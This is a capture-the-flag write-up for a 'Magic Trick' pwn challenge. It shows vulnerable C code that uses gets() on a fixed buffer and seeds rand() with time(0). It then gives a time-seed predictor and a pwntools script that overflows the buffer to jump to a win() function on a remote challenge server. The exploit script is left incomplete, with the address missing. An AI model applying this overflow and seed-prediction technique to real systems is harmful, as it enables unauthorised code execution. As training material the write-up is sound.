# Magic Trick
![](https://img.shields.io/badge/category-pwn-blue)

> I have a cool magic trick to show you, any trick you have for me?

<details>
<summary>Hint:</summary>
Seems like the magician only has so much memory to remember your name, what happens if you overflow his mind.

https://owasp.org/www-community/vulnerabilities/Buffer_Overflow

Use a debugger like gdb or pwndbg
</details>

Let's take a look at the source

```c
#include <stdio.h>
#include <stdlib.h>

void win(){
	system("cat flag.txt");
}

int main(){
	char name[40];
	int tim = time(0);
	srand(tim);
	int secret_card=rand()%10001;
	printf("Time entered: %d\n",tim);
	printf("Welcome! Pick a card, any card! (0-10000)\n");
	int choice;
	scanf("%d\n",&choice);
	if(choice!=secret_card){
		printf("Not that card!\n");
	}else{
		printf("I knew you would choose card %d\n",secret_card);
		printf("For my next trick, I will need your name, what is your name?\n: ");
		gets(name);
		printf("Hi %s, it is nice to meet you\n",name);
	}
	return 0;
}
```

So it seems like we need to guess the number generated from `rand()` and then use a bufferoverflow in `gets` to jump to `win()`.

We can predict the value in `rand()` as `srand()` sets the seed for `rand()` and `time(0)` is the current time and is what's passed into `srand()`.

We can predict the value by running this program the same time as we connect to the challenge.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    srand(time(0));
    rand();
    printf("%d\n",rand()%10001);
}
```

As for the bufferoverflow, `gets()` will read as many bytes as it wants till a newline, meaning we're able to read more than 40 bytes in and overwrite many internal variables, one including the return pointer which is the address which is jump to when the `main` function is finished.

We can get the address of `win()` using several method.

In order to jump to the `win()` function, we need to know the number of characters to put before the return pointer overwrite

By trial and error, know we need 48 characters of padding to overwrite the return pointer

I use this python script to pwn the binary

```python
from pwn import *

def get_rand():
    conn = process('./gen_rand')
    v = conn.recvline()
    conn.close()
    return int(v)

con = remote('159.203.32.136',30001)
con.sendline(str(get_rand()))

payload = 'A'*48 # Padding
win_addr = # The win address
payload += p64(win_addr)
con.sendline(payload)
con.interactive()
```
`CTF{changing_code_execution_is_a_cool_magic_trick}`
